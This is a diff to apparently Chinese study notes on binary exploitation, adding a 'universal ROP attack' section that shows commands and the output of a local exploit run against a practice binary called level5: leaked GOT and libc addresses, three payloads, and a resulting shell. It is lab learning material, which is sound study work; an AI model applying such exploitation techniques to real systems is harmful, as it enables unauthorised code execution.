@@ -187,6 +187,24 @@ $ python exp6.py<br>
 $ whoami
 [用户名] <br><br>
 
+### 通用ROP攻击
+$ objdump -d ./level5
+$ python exp7.py<br>
+[*] '/home/dzh/learning/level5'<br>
+[+] Starting local process './level5': pid 4031<br>
+got_write: 0x601018<br>
+got_read: 0x601020<br>
+off_system_addr: 0xb1f20<br>
+#############sending payload1#############<br>
+write_addr: 0x7ffff7b042b0<br>
+system_addr: 0x7ffff7a52390<br>
+Hello, World<br>
+#############sending payload2#############<br>
+Hello, World<br>
+#############sending payload3#############<br>
+[*] Switching to interactive mode<br>
+$ whoami<br>
+[用户名] <br><br>
 
 
 
